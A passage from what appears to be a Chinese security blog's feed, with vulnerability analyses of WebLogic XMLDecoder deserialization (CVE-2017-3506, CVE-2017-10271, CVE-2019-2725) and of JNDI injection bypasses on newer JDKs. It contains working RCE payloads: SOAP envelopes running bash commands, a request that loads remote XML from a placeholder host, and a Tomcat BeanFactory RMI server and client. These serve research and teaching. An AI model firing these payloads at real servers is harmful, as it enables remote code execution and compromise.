class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>也正是因为这样的黑名单限制，所以很快就出了CVE-2017-10271。</p><h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><p>这个版本对应的poc，即和上边的区别即将<code>object</code>修改成<code>void</code>，就轻松绕过了补丁：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>简单看了一些<a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">XMLDecoder解析流程分析</a>文章中的分析，<code>VoidElementHandler</code>类继承的<code>ObjectElementsHandler</code>类，只改写了<code>isArgument</code>函数，而在整个触发过程中并无影响，所以此处使用void标签与object标签没有区别。<br><img src="https://i.loli.net/2020/02/11/DZKXxspoI23WLUq.jpg" alt=""></p><p>而补丁的形式依然是黑名单限制标签的形式：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure></p><h3 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h3><p>时隔两年：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: localhost:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 728</span><br><span class="line">Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">   &lt;soapenv:Header&gt; </span><br><span class="line">   &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">   &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">   &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">   &lt;java&gt;</span><br><span class="line">&lt;class&gt;&lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt;</span><br><span class="line">&lt;void&gt;</span><br><span class="line">&lt;string&gt;http://xxxx&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/class&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;   </span><br><span class="line">&lt;/soapenv:Header&gt;   </span><br><span class="line">&lt;soapenv:Body&gt;     </span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;   </span><br><span class="line">&lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p>使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手。网上通用的有：</p><ul><li>FileSystemXmlApplicationContext</li><li>UnitOfWorkChangeSet</li></ul><p>这次的修复最终将class标签给禁用了。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>能力有限，从搭建到复现分析花了不少时间，在过程中也学习收获不少。最后感谢@hu3sky师傅的帮助，以及下面这些师傅的文章分享。</p><p>参考文章：</p><ul><li><a href="http://whip1ash.cn/2018/10/21/weblogic-deserialization" target="_blank" rel="noopener">@whip1ash CVE-2017-3506 &amp; CVE-2017-10271 - 从0开始学习Java反序列化 (1) </a></li><li><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">@gyyyy《浅析Java序列化和反序列化》</a></li><li><a href="https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">WebLogic 动态调试环境搭建</a></li><li><a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">XMLDecoder解析流程分析</a></li><li><a href="https://www.kingkk.com/2019/05/Weblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">@kingkk Weblogic-XMLDecoder反序列化学习</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="weblogic" scheme="http://0day.design/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入高版本jdk绕过学习</title>
    <link href="http://0day.design/2020/02/04/JNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>http://0day.design/2020/02/04/JNDI注入高版本jdk绕过学习/</id>
    <published>2020-02-04T11:10:00.000Z</published>
    <updated>2020-03-03T07:57:55.210Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>在之前的复现分析过程中用到的jdk版本都是较低的版本，这篇文章主要研究不同jdk版本对JNDI注入不同姿势的影响，以及绕过姿势。关于JNDI注入和RMI的基础知识可以参考这两篇文章学习：</p><ul><li><a href="https://curz0n.github.io/2019/09/20/cve-2019-14540/" target="_blank" rel="noopener">curz0n: CVE-2019-14540远程代码执行漏洞分析&amp;复现</a></li><li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">kingx: 深入理解JNDI注入与Java反序列化漏洞利用</a></li></ul><h2 id="RMI-Remote-Object-Payload-限制较多，不常使用"><a href="#RMI-Remote-Object-Payload-限制较多，不常使用" class="headerlink" title="RMI Remote Object Payload (限制较多，不常使用)"></a>RMI Remote Object Payload (限制较多，不常使用)</h2><h2 id="RMI-JNDI-Reference-Payload"><a href="#RMI-JNDI-Reference-Payload" class="headerlink" title="RMI + JNDI Reference Payload"></a>RMI + JNDI Reference Payload</h2><p>这个方法就是我们常用的加载远程class进行JNDI注入的操作，攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类，但是原理上并非使用RMI Class Loading机制的，因此不受 <code>java.rmi.server.useCodebaseOnly</code>系统属性的限制，相对来说更加通用。</p><p>但是在JDK 6u132,JDK 7u122,JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启RMI Registry或者COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p><p>Changelog:</p><ul><li>JDK 6u141 <a href="http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141</a></li><li>JDK 7u131 <a href="http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html</a></li><li>JDK 8u121 <a href="http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html</a></li></ul><p>案例参考笔记：<a href="mweblib://15800918927450" target="_blank" rel="noopener">深入理解RMI&amp;JRMP&amp;JNDI</a></p><h3 id="触发过程分析"><a href="#触发过程分析" class="headerlink" title="触发过程分析"></a>触发过程分析</h3><h4 id="低版本8u73测试"><a href="#低版本8u73测试" class="headerlink" title="低版本8u73测试"></a>低版本8u73测试</h4><p>产生JNDI注入的原因是客户端<code>lookup</code>方法可控，我们先在Registry中注册恶意的Reference对象，加载远程类对象。<br><img src="https://i.loli.net/2020/02/04/SA6bHygZ1i2XPvc.jpg" alt="-w1162"></p><p>将Registry的url地址传入<code>InitialContext.lookup(URL)</code>方法中，这里用低版本8u73下断点调试:<br>/com/sun/jndi/toolkit/url/GenericURLContext.class<br><img src="https://i.loli.net/2020/02/04/PIUEtu54kNjfQix.jpg" alt="-w1278"><br>解析URL，将Exploit类传入，<code>lookup</code>方法调用<code>decodeObject</code>方法：/com/sun/jndi/rmi/registry/RegistryContext.class<br><img src="https://i.loli.net/2020/02/04/1gDbwn8KlpoNxai.jpg" alt="-w1330"><br>又进入到<code>NamingManager.getObjectInstance</code>方法：<br><img src="https://i.loli.net/2020/02/04/iRMQuYLSU9xPOTc.jpg" alt="-w1325"><br>在进入<code>getObjectInstance</code>方法后又在319行调用<code>getObjectFactoryFromReference</code>方法，先从本地的类加载器去<code>classpath</code>加载目标类，如果没有，则调用<code>loadClass(factoryName, codebase)</code>去远程加载我们构造的特定类，并将其实例化：<br><img src="https://i.loli.net/2020/02/04/yCHxrOaX1FkEAbD.jpg" alt="-w1391"></p><p> <img src="https://i.loli.net/2020/02/04/jFlGYP6y7VUxoNp.jpg" alt="-w1335"></p><p>整个利用流程：</p><ul><li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li><li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server/classname；</li><li>击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li><li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li><li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li></ul><h4 id="高版本8u201测试"><a href="#高版本8u201测试" class="headerlink" title="高版本8u201测试"></a>高版本8u201测试</h4><p>再来看看高版本8u201，在RegistryContext.class#decodeObject函数中，增加了<code>trustURLCodebase</code>的判断，且默认为<code>false</code>。<br><img src="https://i.loli.net/2020/02/04/W9Edkum7QgLRY38.jpg" alt="-w1243"></p><p>多个判断是逻辑与的关系，有一个不成立则可通过，这里可以利用<code>var8.getFactoryClassLocation()</code>为<code>null</code>进入<code>NamingManager.getObjectInstance</code>函数：<br><img src="https://i.loli.net/2020/02/04/BJckUNmv6MlsWK3.jpg" alt="-w1448"><br>接着进入<code>getObjectFactoryFromReference</code>函数，但是在加载远程类之前又进行了一次<code>null</code>判断，加载远程类：<br><img src="https://i.loli.net/2020/02/04/Zp98zRtWGmDUY4K.jpg" alt="-w1200"></p><p>所以这里的利用条件就变成了只能用<code>helper.loadClass(factoryName)</code>加载目标机器中<code>classpath</code>中的类。从下图NamingManager.java的代码中可以知道，该类要实现 <code>javax.naming.spi.ObjectFactory</code>接口，且存在<code>getObjectInstance</code>方法：<br><img src="https://i.loli.net/2020/02/04/vpW2wES8aHOqzD7.jpg" alt="-w1364"></p><p>总结一下高版本利用条件即：</p><ul><li>利用目标机器<code>classpath</code>类</li><li>实现了<code>javax.naming.spi.ObjectFactory</code>接口</li><li>存在<code>getObjectInstance</code>方法</li></ul><p>在下文中会介绍详细案例利用细节。</p><h2 id="LDAP-JNDI-Reference-Payload"><a href="#LDAP-JNDI-Reference-Payload" class="headerlink" title="LDAP + JNDI Reference Payload"></a>LDAP + JNDI Reference Payload</h2><p>除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。<br>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p><p>案例参考笔记：<a href="mweblib://15800918927450" target="_blank" rel="noopener">深入理解RMI&amp;JRMP&amp;JNDI</a></p><p>这里为了探究具体的修改点，跟进了8u181和8u201两个版本的ldap加载流程，解析codebase的流程不受<code>com.sun.jndi.rmi.object.trustURLCodebase`</code>com.sun.jndi.cosnaming.object.trustURLCodebase<code>属性影响，但在最后加载远程class的函数</code>helper.loadClass(factoryName, codebase)<code>高版本8u201条件添加了</code>trustURLCodebase`(默认为false)的校验，如下图所示：<br><img src="https://i.loli.net/2020/02/04/q6x8Flwf3JKYRLb.jpg" alt="-w803"></p><p><img src="https://i.loli.net/2020/02/04/v4gQZSNBaReHXCt.jpg" alt="-w1449"></p><h2 id="绕过JDK-8u191-等高版本限制"><a href="#绕过JDK-8u191-等高版本限制" class="headerlink" title="绕过JDK 8u191+等高版本限制"></a>绕过JDK 8u191+等高版本限制</h2><p>所以对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：</p><ol><li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li><li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li><li>JRMP：<a href="https://mp.weixin.qq.com/s?__biz=MzU4MTg1NzAzMA==&amp;mid=2247483796&amp;idx=1&amp;sn=ce4249ba61d7f402a1211e508f83d2b4&amp;chksm=fd407bfdca37f2ebd51202f8221d320ccd639fd48d6a2adcb53c17ccb143fc3f037e6198662a&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1577970121763&amp;sharer_shareid=b6a93c2ad862a6198898de9305c515e1#rd" target="_blank" rel="noopener">空指针-treasure-Writeup</a><br>这三种方式都依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</li></ol><h3 id="利用本地Class作为Reference-Factory绕过高版本限制"><a href="#利用本地Class作为Reference-Factory绕过高版本限制" class="headerlink" title="利用本地Class作为Reference Factory绕过高版本限制"></a>利用本地Class作为Reference Factory绕过高版本限制</h3><p>在上文中<em>RMI + JNDI Reference Payload</em>部分我们已经介绍了在高版本修复策略，以及绕过的利用条件。在<code>org.apache.naming.factory.BeanFactory</code>中刚好满足条件并且存在被利用的可能，该接口存在于Tomcat依赖包中，使用也是非常广泛。</p><p><strong>环境搭建</strong><br>之前用pom.xml拉tomcat的包复现蜜汁原因失败，后来用的MxSrvs里自带的tomcat依赖复现成功了。<br><img src="https://i.loli.net/2020/02/04/4g3GXuAzPqwS62r.jpg" alt="-w1393"><br>为了便于分析去导个源码，找到对应的版本，点下图所示的View All<br><img src="https://i.loli.net/2020/02/04/CBjutm9X2J5641c.jpg" alt="-w811"><br><img src="https://i.loli.net/2020/02/04/W5mGFZdpnULw8KV.jpg" alt="-w783"><br>然后去idea里导入就行了</p><p><strong>漏洞复现</strong><br>poc:<br>Server.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        ResourceRef resourceRef = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, (String)<span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>, <span class="string">"org.apache.naming.factory.BeanFactory"</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"a=eval"</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"a"</span>, <span class="string">"Runtime.getRuntime().exec(\"open /Applications/Calculator.app/\")"</span>));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">"EvalObj"</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">"the Server is bind rmi://127.0.0.1:1098/EvalObj"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Client.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/EvalObj"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri); <span class="comment">// 返回加载的远程对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/04/yuJYBWomF597PTG.jpg" alt="-w1541"></p><p><strong>漏洞分析</strong><br>/org/apache/naming/factory/BeanFactory.java 这个类满足上述提到的高版本利用的两个条件：<br><img src="https://i.loli.net/2020/03/02/QDcTr9JA8ShlBo1.jpg" alt="-w1105"><br>BeanFactory.java#getObjectInstance，从上文<em>RMI + JNDI注入的触发流程</em>分析中可以知道，可控参数为<code>obj</code>和<code>name</code>。<br>这里限制了传入的对象必须为<code>ResourceRef</code>类，通过反射调用在148行实例化了一个无参对象，意味着<code>beanClass</code>得有一个无参构造函数：<br><img src="https://i.loli.net/2020/03/02/6LXxbc3WeOSGuoN.jpg" alt="-w1149"></p><p>接着取出key为<code>forceString</code>的值进行以<code>,</code>分割，拆分<code>=</code>键值对，存入<code>hashMap</code>对象中：<br><img src="https://i.loli.net/2020/03/02/9U1dkaLo8CNjSmK.jpg" alt="-w1240"></p><p>其后通过反射执行我们指定的之前构造的方法，并可以传入一个字符串类型的参数：<br><img src="/2020/02/04/JNDI注入高版本jdk绕过学习/media/15806219737687/15807290085893.jpg" alt="-w1219"></p><p>到这里利用过程就结束了，再来跟一下利用限制如何满足，第一个条件是传入的对象必须是属于<code>ResourceRef</code>类，接着调用了<code>ref.getClassName()</code>获取<code>beanClassName</code>，也就是目标类：<br><img src="/2020/02/04/JNDI注入高版本jdk绕过学习/media/15806219737687/15807861859907.jpg" alt="-w933"><br><img src="https://i.loli.net/2020/03/02/bEPc63Q97CLlNyf.jpg" alt="-w582"></p><p>跟进<code>ResourceRef</code>类，该类也是<code>Reference</code>的子类，在实例化的时候，可以通过构造方法传入目标class：<br><img src="https://i.loli.net/2020/03/02/mzuGeyKV7TFDbag.jpg" alt="-w855"><br>通过调用父类的构造方法实现成员变量<code>className</code>的赋值<br><img 